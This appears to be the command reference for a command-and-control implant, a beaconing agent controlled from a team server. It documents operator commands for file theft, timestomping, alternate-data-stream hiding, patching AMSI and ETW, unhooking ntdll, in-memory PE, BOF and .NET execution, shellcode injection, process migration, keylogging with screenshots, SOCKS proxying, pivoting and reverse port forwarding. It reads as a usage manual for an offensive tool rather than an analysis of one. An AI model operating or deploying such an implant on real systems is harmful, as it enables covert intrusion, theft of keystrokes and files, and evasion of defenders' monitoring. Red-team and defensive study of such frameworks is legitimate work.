# Command Reference

All commands are sent to the agent via the terminal or API. Unrecognized commands are passed to the system shell.

## Session Control

| Command | Description |
|---------|-------------|
| `sleep <secs> <jitter_min> <jitter_max>` | Set beacon interval and jitter range |
| `beacon:mode active` | Switch to fast mode (100ms polling) |
| `beacon:mode passive` | Switch back to normal sleep interval |
| `sys:die` | Self-destruct: delete binary and exit |
| `exit` | Clean exit without self-destruct |
| `fallback:config` | Show configured fallback endpoints |

## File Operations

| Command | Description |
|---------|-------------|
| `file:read\|<path>` | Download a file (base64 encoded) |
| `file:write\|<path>\|<base64>` | Upload a file |
| `file:read_recursive\|<path>` | Download an entire directory tree |
| `fs:ls <path>` | List directory contents (JSON) |

## Artifact Management

| Command | Description |
|---------|-------------|
| `timestomp <target> <reference>` | Copy timestamps from reference to target |
| `timestomp:set <path> <epoch>` | Set timestamps to Unix epoch value |
| `secure_delete <path>` | 4-pass overwrite + delete |
| `ads:write <path> <stream> <b64>` | Write to NTFS Alternate Data Stream |
| `ads:read <path> <stream>` | Read from ADS (returns base64) |
| `ads:list <path>` | List all ADS on a file |

## Job System

| Command | Description |
|---------|-------------|
| `bg <command>` | Run shell command as background job |
| `jobs:list` | List all jobs with status |
| `jobs:kill <id>` | Abort a running job |
| `jobs:purge` | Remove finished jobs from the list |

## Evasion

| Command | Description |
|---------|-------------|
| `evasion:patch_amsi` | Patch AmsiScanBuffer → return E_INVALIDARG |
| `evasion:patch_etw` | Patch EtwEventWrite → return STATUS_SUCCESS |
| `evasion:unhook_ntdll` | Replace hooked ntdll .text with clean copy from disk |
| `evasion:patch_all` | Run all three patches in sequence |
| `evasion:syscall_check` | Resolve and display syscall numbers + gadget address |

## In-Memory Execution

| Command | Description |
|---------|-------------|
| `inmem:pe <base64>` | Load and execute a PE (EXE or DLL) in memory |
| `inmem:bof <b64_coff> [b64_args]` | Run a Beacon Object File |
| `inmem:dotnet <path> <Type> <Method> <arg> [runtime]` | Execute .NET assembly via CLR |
| `ext:load <base64_script> [args...]` | Run a Rhai extension script (as background job) |

## Process Operations

| Command | Description |
|---------|-------------|
| `proc:inject <pid> <base64_shellcode>` | Inject shellcode via remote APC |
| `migrate:spawn <binary>` | Spawn process and migrate agent into it |
| `migrate:inject <pid>` | Migrate agent into existing process |

## Keylogger

| Command | Description |
|---------|-------------|
| `keylogger:start` | Start keystroke/clipboard/screenshot capture |
| `keylogger:stop` | Stop capture |
| `keylogger:dump` | Retrieve and download captured data |

## Network

| Command | Description |
|---------|-------------|
| `proxy:start <port>` | Start SOCKS5 proxy tunnel |
| `proxy:stop` | Stop SOCKS5 proxy |
| `pivot:listener_tcp <port>` | Start TCP pivot listener for child agents |
| `pivot:listener_smb <pipe_name>` | Start named pipe pivot listener (Windows) |
| `rportfwd:start <tunnel_port> <host> <port>` | Start reverse port forward (agent connects tunnel, forwards to host:port) |
| `rportfwd:stop <tunnel_port>` | Stop a reverse port forward by tunnel port |
| `rportfwd:list` | List all active reverse port forwards |

### Reverse Port Forwarding (API)

Reverse port forwarding is typically managed via the API rather than raw commands:

| Method | Endpoint | Body | Description |
|--------|----------|------|-------------|
| `POST` | `/api/hosts/:id/rportfwd` | `{"bind_port": 8888, "target_host": "10.1.1.5", "target_port": 3389}` | Bind port 8888 on the team server, tunnel through the agent to 10.1.1.5:3389 |
| `DELETE` | `/api/hosts/:id/rportfwd` | `{"bind_port": 8888}` | Stop the reverse port forward |
| `GET` | `/api/rportfwds` | — | List all active reverse port forwards |

## Shell

Any command not matching the above is passed directly to the OS shell (`sh -c` on Linux, `powershell -NoProfile -Command` on Windows).
